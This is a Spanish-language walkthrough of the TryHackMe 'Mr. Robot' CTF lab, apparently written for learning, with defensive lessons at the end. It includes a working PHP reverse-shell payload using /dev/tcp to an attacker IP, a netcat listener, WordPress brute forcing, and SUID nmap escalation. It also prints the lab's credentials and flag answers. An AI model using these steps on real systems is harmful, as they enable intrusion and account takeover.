# Mr. Robot CTF — Manual Completo
## TryHackMe | Writeup y Guía de Aprendizaje
**Usuario:** Regolith | **Sistema atacante:** Debian 13 Trixie, ThinkPad T480

---

## Resumen del Lab

Mr. Robot CTF es una máquina Linux de dificultad media inspirada en la serie de TV Mr. Robot. El objetivo es encontrar 3 llaves (flags) ocultas en el sistema. Para lograrlo se recorre el flujo completo de un pentest real:

```
Reconocimiento → Enumeración → Explotación → Post-explotación → Escalada de privilegios
```

**Datos de la máquina:**
- IP objetivo: `10.64.128.147` (puede cambiar al reiniciar en THM)
- IP atacante (tun0): `192.168.190.88`
- OS: Linux (Ubuntu/Debian)
- Servicios: HTTP (80), HTTPS (443), SSH (22)
- CMS: WordPress 4.3.1

---

## Fase 0 — Preparación del entorno

### Conexión VPN a THM

TryHackMe usa una VPN para conectar tu máquina con la red de laboratorios. Sin esto no puedes alcanzar la máquina objetivo.

```bash
sudo openvpn ~/Downloads/tuusuario.ovpn
```

Dejas esa terminal corriendo y abres otra para trabajar. La conexión está lista cuando ves:
```
Initialization Sequence Completed
```

**¿Por qué tun0?**
La interfaz `tun0` es el túnel VPN virtual que crea OpenVPN. Todo el tráfico hacia la red de THM sale por ahí. Por eso el listener de la reverse shell debe apuntar a esa IP — es la que la máquina objetivo puede alcanzar.

```bash
ip a show tun0   # Verificar IP del túnel
```

---

## Fase 1 — Reconocimiento con Nmap

### ¿Qué es Nmap?

Nmap (Network Mapper) es la herramienta estándar para descubrir qué servicios están corriendo en una máquina. Envía paquetes TCP/UDP y analiza las respuestas para determinar qué puertos están abiertos y qué software los atiende.

### Comando usado

```bash
nmap -sV -sC 10.64.128.147 -oN scan.txt
```

**Flags explicadas:**
- `-sV` — Service Version: intenta detectar la versión exacta del software en cada puerto
- `-sC` — Scripts: corre scripts por defecto de Nmap (equivale a `--script=default`)
- `-oN scan.txt` — guarda el output en formato legible

### Resultados

```
PORT    STATE  SERVICE  VERSION
22/tcp  open   ssh      OpenSSH
80/tcp  open   http     Apache
443/tcp open   https    Apache
```

**¿Por qué importa esto?**
Puertos 80 y 443 = servidor web. Eso significa interfaz accesible por navegador y posiblemente un CMS como WordPress — superficie de ataque grande. SSH en 22 queda como vector secundario si conseguimos credenciales.

---

## Fase 2 — Enumeración Web con Gobuster

### ¿Qué es Gobuster?

Gobuster es un enumerador de directorios web. Toma una wordlist (lista de palabras) y hace peticiones HTTP a cada una para descubrir rutas ocultas que no están enlazadas en la página.

```bash
gobuster dir -u http://10.64.128.147 -w /usr/share/wordlists/dirb/common.txt
```

**Flags:**
- `dir` — modo de enumeración de directorios
- `-u` — URL objetivo
- `-w` — wordlist a usar

### Rutas importantes encontradas

```
/robots.txt      → archivo de indexación de buscadores
/wp-login.php    → panel de login de WordPress
/wp-admin        → panel de administración
```

### El archivo robots.txt

`robots.txt` es un archivo que los sitios usan para decirle a los motores de búsqueda qué no indexar. En este lab contenía rutas críticas:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```bash
wget http://10.64.128.147/key-1-of-3.txt   # KEY 1 ✓
wget http://10.64.128.147/fsocity.dic       # Diccionario para fuerza bruta
```

### Procesamiento del diccionario

`fsocity.dic` tenía miles de líneas duplicadas — un diccionario sucio. Limpiarlo acelera enormemente el ataque de fuerza bruta:

```bash
sort fsocity.dic | uniq > lista_limpia.txt
wc -l fsocity.dic        # ~858,000 líneas
wc -l lista_limpia.txt   # ~11,000 líneas únicas
```

**Concepto clave:** `sort` ordena alfabéticamente, `uniq` elimina líneas consecutivas duplicadas. Combinados eliminan el 98% del ruido.

---

## Fase 3 — Identificación de usuario

### User enumeration en WordPress

WordPress 4.3.1 tiene una vulnerabilidad de enumeración de usuarios: los mensajes de error del login son diferentes según si el usuario existe o no.

- Usuario incorrecto: `"Invalid username"`
- Usuario correcto, contraseña incorrecta: `"The password you entered for the username X is incorrect"`

Esto permite confirmar que el usuario `elliot` existe antes de atacar — ahorrando tiempo y reduciendo ruido.

**MITRE ATT&CK:** T1589.003 — Gather Victim Identity Information

---

## Fase 4 — Fuerza Bruta con WPScan

### ¿Qué es WPScan?

WPScan es un escáner específico para WordPress. Puede enumerar usuarios, plugins vulnerables, temas, y realizar ataques de fuerza bruta contra el login.

```bash
wpscan --url http://10.64.128.147 \
       --usernames elliot \
       --passwords lista_limpia.txt \
       --password-attack wp-login
```

### Credenciales obtenidas

```
Usuario:    elliot
Contraseña: ER28-0652
```

Con esto se accede al panel de administración `/wp-admin` con control total del CMS.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Fase 5 — Ejecución Remota de Código (RCE) y Reverse Shell

### ¿Qué es una Reverse Shell?

En una shell normal (bind shell), tú te conectas al servidor. En una **reverse shell**, el servidor se conecta a ti. Esto evade firewalls porque la conexión sale del servidor objetivo hacia afuera — y los firewalls típicamente bloquean entrantes pero permiten salientes.

```
Shell normal:   Tú ────────────────► Servidor
Reverse shell:  Tú ◄──────────────── Servidor
```

### El vector: Editor de Temas de WordPress

WordPress permite editar archivos PHP del tema activo desde el panel de administración:

```
Apariencia → Editor → 404 Template (404.php)
```

Al modificar `404.php` con código PHP malicioso, Apache lo ejecuta cuando alguien visita esa URL directamente.

### El payload

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.190.88/443 0>&1'"); ?>
```

**Disección del payload:**

`exec()` — función PHP que ejecuta comandos del sistema operativo directamente.

`bash -i` — lanza bash en modo interactivo.

`/dev/tcp/IP/PUERTO` — no es un archivo real. Es una característica nativa del kernel de Linux que abre una conexión TCP. No requiere herramientas externas.

`>& /dev/tcp/192.168.190.88/443` — redirige stdout Y stderr hacia tu máquina por TCP.

`0>&1` — redirige stdin (tu teclado) al mismo canal. Esto completa el canal bidireccional.

### ¿Por qué puerto 443 y no 4444?

El servidor de THM tiene restricciones en conexiones salientes. El puerto `443` es HTTPS — está permitido en prácticamente cualquier firewall porque bloquearlo rompería la navegación web. Puertos altos como `4444` no tienen ese privilegio.

**Regla general para reverse shells:**
Probar en este orden: `443` → `80` → `8080` → `8443`

### El listener

```bash
sudo nc -lvnp 443
```

**Flags de netcat:**
- `-l` — modo escucha (listen)
- `-v` — verbose, muestra conexiones
- `-n` — no resolver DNS
- `-p 443` — puerto a escuchar

`sudo` es necesario porque puertos menores a 1024 requieren permisos de root en Linux.

### Disparar la shell

```bash
curl http://10.64.128.147/wp-content/themes/twentyfifteen/404.php
```

Al visitar directamente el archivo PHP, Apache lo interpreta y ejecuta el payload. La conexión TCP llega a tu listener.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Fase 6 — Post-explotación: Key 2

### Usuario obtenido

Al entrar con la reverse shell eres el usuario `daemon` — el usuario con el que corre Apache. Tienes acceso limitado al sistema.

```bash
whoami   # daemon
```

### Encontrar la key 2

```bash
find / -name "key-2-of-3.txt" 2>/dev/null
# /home/robot/key-2-of-3.txt
```

```bash
cat /home/robot/key-2-of-3.txt
# Permission denied — el archivo pertenece a robot
```

### Hash MD5 en el directorio de robot

```bash
ls -la /home/robot/
# key-2-of-3.txt
# password.raw-md5
```

El archivo `password.raw-md5` contiene:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Crackeo del hash MD5

MD5 es un algoritmo de hash obsoleto y vulnerable a ataques de diccionario. El hash `c3fcd3d76192e4007dfb496cca67e13b` se puede crackear con:

```bash
# Con John the Ripper
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Con Hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# O en CrackStation.net (online)
```

**Resultado:** `abcdefghijklmnopqrstuvwxyz`

### Cambiar al usuario robot

La reverse shell cruda no tiene TTY completa. Para ejecutar `su` necesitas estabilizarla:

```bash
script /dev/null -c bash   # Crea pseudo-TTY
su robot                    # Introduce: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt   # KEY 2 ✓
```

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Fase 7 — Escalada de Privilegios: Key 3

### Búsqueda de binarios SUID

SUID (Set User ID) es un permiso especial en Linux. Cuando un binario tiene SUID activado, se ejecuta con los permisos del propietario del archivo — no del usuario que lo corre. Si el propietario es root y el binario tiene SUID, cualquier usuario puede ejecutarlo como root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**`-perm -4000`** busca archivos donde el bit SUID (4000) esté activo.

### El binario vulnerable: Nmap

```
/usr/local/bin/nmap   ← SUID + propietario root = escalada garantizada
```

Nmap versiones 2.02 a 5.21 tienen un modo interactivo (`--interactive`) que permite ejecutar comandos del shell. Como tiene SUID de root, esos comandos corren como root.

```bash
nmap --interactive
nmap> !sh           # Escapa al shell del sistema
# sh-4.3# whoami
# root
```

**¿Por qué `!sh` funciona?**
El `!` en el modo interactivo de nmap es un escape al shell — igual que en vim, less, o man. Al tener SUID de root, el shell que abre hereda esos permisos.

```bash
find / -name "key-3-of-3.txt" 2>/dev/null
cat /ruta/key-3-of-3.txt   # KEY 3 ✓
```

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Resumen del flujo completo

```
robots.txt          →  Key 1 + diccionario fsocity.dic
                              ↓
WPScan fuerza bruta →  elliot:ER28-0652
                              ↓
wp-admin editor     →  RCE via 404.php (PHP exec + /dev/tcp)
                              ↓
Reverse shell       →  usuario daemon
                              ↓
/home/robot/        →  hash MD5 → abcdefghijklmnopqrstuvwxyz → su robot
                              ↓
Key 2               →  822c73956184f694993bede3eb39f959
                              ↓
nmap --interactive  →  root via SUID
                              ↓
Key 3               →  ¡Completado!
```

---

## Conceptos clave aprendidos

| Concepto | Qué es | Dónde se usó |
|----------|--------|--------------|
| **Nmap** | Escáner de puertos y servicios | Reconocimiento inicial |
| **Gobuster** | Enumerador de directorios web | Encontrar /robots.txt y wp-admin |
| **robots.txt** | Archivo de indexación de buscadores | Key 1 y diccionario |
| **WPScan** | Escáner específico de WordPress | Fuerza bruta de credenciales |
| **User enumeration** | Identificar usuarios válidos por mensajes de error | Confirmar usuario elliot |
| **Brute force** | Probar contraseñas masivamente | Obtener ER28-0652 |
| **RCE** | Remote Code Execution — ejecutar código en el servidor | Payload en 404.php |
| **Reverse shell** | El servidor se conecta hacia ti | /dev/tcp payload |
| **/dev/tcp** | Interfaz del kernel Linux para TCP | Dentro del payload bash |
| **TTY** | Terminal real con control de procesos | Estabilizar shell para su |
| **MD5** | Algoritmo de hash (obsoleto/vulnerable) | Hash de contraseña de robot |
| **Hash cracking** | Recuperar texto plano de un hash | john/hashcat → abcdefghijklmnopqrstuvwxyz |
| **SUID** | Bit que ejecuta binario como su propietario | nmap SUID → root |
| **Privilege escalation** | Pasar de usuario limitado a root | nmap --interactive |
| **MITRE ATT&CK** | Framework de TTPs de atacantes reales | Clasificar cada técnica |
| **OPSEC** | No filtrar datos sensibles a internet | Todo local con REGO |

---

## Herramientas usadas

```bash
nmap        # Reconocimiento
gobuster    # Enumeración web
wget        # Descargar archivos del servidor
wpscan      # Ataque a WordPress
nc          # Netcat — listener de reverse shell
john        # Crackeo de hashes
hashcat     # Crackeo de hashes (alternativa)
curl        # Disparar el payload HTTP
```

---

## Lecciones de Blue Team (defensa)

Cada vulnerabilidad explotada tiene su mitigación:

**WordPress desactualizado**
→ Mantener WordPress, temas y plugins siempre actualizados.

**robots.txt exponiendo rutas sensibles**
→ Nunca listar rutas privadas en robots.txt — es público por definición.

**Editor de temas activo en producción**
→ Deshabilitar en `wp-config.php`: `define('DISALLOW_FILE_EDIT', true);`

**Contraseña débil**
→ Usar contraseñas largas y aleatorias. `abcdefghijklmnopqrstuvwxyz` es trivialmente crackeable.

**MD5 para contraseñas**
→ Usar bcrypt, Argon2 o scrypt — algoritmos diseñados específicamente para passwords.

**Nmap con SUID**
→ Auditar binarios SUID regularmente: `find / -perm -4000 -type f 2>/dev/null`
→ Nunca dar SUID a herramientas que no lo necesiten estrictamente.

---

*Completado en TryHackMe — entorno controlado y autorizado.*
*Técnicas documentadas con fines educativos y de Purple Team.*
